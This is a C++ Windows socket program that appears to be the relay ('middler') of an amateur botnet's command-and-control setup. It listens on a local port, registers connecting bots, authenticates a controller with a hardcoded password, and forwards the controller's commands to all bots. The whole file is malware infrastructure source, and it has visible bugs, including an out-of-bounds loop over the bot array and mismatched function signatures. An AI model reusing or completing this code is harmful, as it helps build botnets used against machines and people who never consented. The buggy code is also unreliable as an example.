#include <iostream>
#include <WinSock2.h>
#include <string>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)

using namespace std;

SOCKET sock, sListen, Con[256];
SOCKADDR_IN addr;

HANDLE hThread, hThreadB, hThreadC;
DWORD IDThread;
DWORD WINAPI reconnect0(LPVOID d);

int hr;

char msg[40];
int s = sizeof(addr);

void close()
{
	CloseHandle(hThreadB);
}

void Wsa()
{
	WSADATA wsaData;
	WORD DLLVersin = MAKEWORD(1, 2);
	WSAStartup(DLLVersin, &wsaData);

}

void setaddr()
{
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(9901);
	addr.sin_family = AF_INET;
}

void listen()
{
	sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);
}

DWORD WINAPI reces(LPVOID d);

DWORD WINAPI setn(int i);

DWORD WINAPI inff(LPVOID g)
{

	char msg2[40] = " ";
	string gg;
	int d = 0;
	while (true)
	{
		cout << "1" << endl;
		sock = accept(sListen, (SOCKADDR*)&addr, &s);
		cout << "2" << endl;;
		recv(sock, msg2, sizeof(msg2), NULL);
		cout << msg2 << 3 << endl;
		//memcpy(gg, msg2, sizeof(msg2));
		gg = msg2;
		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
		{
			Con[0] = sock;
			cout << "4" << endl;;
			cout << "Client connected" << endl;
			hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
		}
		if (gg == "m")
		{
			Con[d] = sock; d++;
			cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl;
		}
		if (d == 256) { d = 1; }
	}

	return 0;
}

DWORD WINAPI reces(LPVOID d)
{
	t7:
	char msg [40] = "Ready to new command";
	string m;
	cout << msg << endl;
	if (recv(Con[0], msg, sizeof(msg), NULL) == 0)
	{
		cout << "Client Disconnected" << endl;
		close();
	}
	else
	{
		m = msg;
		if (m =="ping" || m == "12")
		{

			for (int i = 0; i <= 256; i++)
			{
				cout << i << "=" << msg<<endl;
				send(Con[i], msg, sizeof(msg), NULL);
				closesocket(Con[i]);
				Sleep(100);
			}
			
		}
		goto t7;
	}

	return 0;
}

void sett()
{
	send(Con[hr], msg, sizeof(msg), NULL);
	closesocket(Con[hr]);
	Sleep(100);
}

DWORD WINAPI setn(LPVOID d)
{
	sett();
	return 0;
}

int main()
{
	setlocale(LC_ALL, "russian");


	Wsa();
	setaddr();
	listen();
	hThread = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);
	
	WaitForSingleObject(hThread, INFINITE);
	WaitForSingleObject(hThreadB, INFINITE);
	WaitForSingleObject(hThreadC, INFINITE);

	return 0;
}
